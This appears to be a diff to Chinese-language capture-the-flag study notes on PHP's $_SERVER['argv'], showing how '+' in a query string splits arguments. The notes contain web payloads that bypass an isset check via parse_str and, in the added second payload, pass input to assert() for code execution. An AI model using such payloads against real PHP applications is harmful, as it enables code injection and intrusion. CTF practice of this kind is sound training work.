@@ -197,7 +197,7 @@ if(! is_file($file)){
 ## **$_SERVER['argv']**
 ```
 对于GET传参：?a=b+fl0g=flag_give_me
-$a=$_SERVER['argv']; //为数组
+$a=$_SERVER['argv']; //为数组 
 
 $_SERVER['argV'][0]为 a=b
 $_SERVER['argV'][1]为 fl0g=flag_give_me
@@ -218,10 +218,15 @@ if(!isset($_GET['fl0g'])){
 ?>
 
 
-Payload：
+Payload1：
 GET：?a=1+fl0g=flag_give_me  绕过if(!isset($_GET['fl0g']))
 POST：fun=parse_str($a[1])
 
 由$_SERVER['argV'][1]为 fl0g=flag_give_me
 通过parse_str得 $fl0g=flag_give_me
+
+
+Payload2：
+?$flog=flag_give_me
+fun=assert($a[0])
 ```
